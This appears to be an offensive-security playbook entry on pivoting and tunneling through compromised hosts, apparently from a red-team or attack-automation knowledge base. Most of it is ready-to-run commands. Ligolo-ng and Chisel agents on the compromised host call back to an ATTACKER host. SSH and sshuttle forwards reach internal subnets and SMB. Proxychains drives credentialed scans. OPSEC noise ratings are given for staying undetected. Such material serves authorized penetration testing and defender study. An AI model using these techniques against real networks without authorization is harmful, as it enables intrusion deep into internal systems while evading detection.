# Pivoting and Tunneling

tags: pivoting, tunneling, ligolo, chisel, ssh, socks, proxychains, port-forwarding, sshuttle, double-pivot

## Objective
Establish network tunnels through compromised hosts to reach internal network segments not directly accessible from the attacker machine.

## Prerequisites
- Compromised host with network access to target segment
- Ability to upload/execute tools on pivot host
- Knowledge of target internal subnets

## Methodology

### Ligolo-ng (Best Tool — No Proxychains Needed, OPSEC: 0.3)
```bash
# Attacker setup — create TUN interface
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Target agent — upload and run
./agent -connect ATTACKER:11601 -ignore-cert

# In ligolo console:
# Select session → start
sudo ip route add 10.10.10.0/24 dev ligolo

# Double pivot — add listener on first pivot for second agent
# In ligolo: listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
# Run second agent connecting through first pivot
```
**Key advantage**: TUN interface means nmap SYN scans, ICMP, and all tools work natively without proxychains.

### Chisel (OPSEC: 0.4)
```bash
# Attacker — start server
chisel server -p 8080 --reverse

# Target — reverse SOCKS5 proxy (attacker gets SOCKS on :1080)
chisel client ATTACKER:8080 R:socks

# Target — specific port forward
chisel client ATTACKER:8080 R:8888:INTERNAL_HOST:445
```

### SSH Tunneling (OPSEC: 0.2)
```bash
# Dynamic SOCKS proxy
ssh -D 1080 user@pivot

# Local port forward — access internal service from attacker
ssh -L 8080:INTERNAL:80 user@pivot

# Remote port forward — expose attacker service to internal net
ssh -R 8080:127.0.0.1:445 user@attacker

# ProxyJump multi-hop
ssh -J user@pivot1,user@pivot2 user@target

# sshuttle — transparent proxy (OPSEC: 0.2)
sshuttle -r user@pivot 10.10.10.0/24
```

### Proxychains (for SOCKS-based tunnels)
```bash
# Configure: /etc/proxychains4.conf → socks5 127.0.0.1 1080

# Use with tools
proxychains nxc smb 10.10.10.0/24 -u user -p pass
proxychains nmap -sT -Pn TARGET    # MUST use -sT (no SYN), -Pn (no ICMP)
```
**Limitations**: No ICMP, no UDP, no SYN scan through SOCKS. Use Ligolo-ng for full protocol support.

## Graph Reporting
- **REACHABLE edges**: from pivot host to newly accessible subnet nodes
- **Subnet nodes**: new internal subnets discovered through pivot
- **Host nodes**: discovered on internal segments
- Each pivot expands the attack surface — triggers new Network Recon cycle

## OPSEC Notes

| Technique | Noise Rating |
|-----------|-------------|
| Ligolo-ng | 0.3 |
| Chisel | 0.4 |
| SSH dynamic SOCKS | 0.2 |
| SSH local/remote forward | 0.2 |
| sshuttle | 0.2 |

**Detection**: Unusual outbound connections from compromised host, long-lived TCP sessions, SSH connections to non-standard ports.

## Sequencing
- **After**: Lateral Movement (need shell on pivot host)
- **Feeds →**: Network Recon on new segments, repeat full attack cycle on internal networks
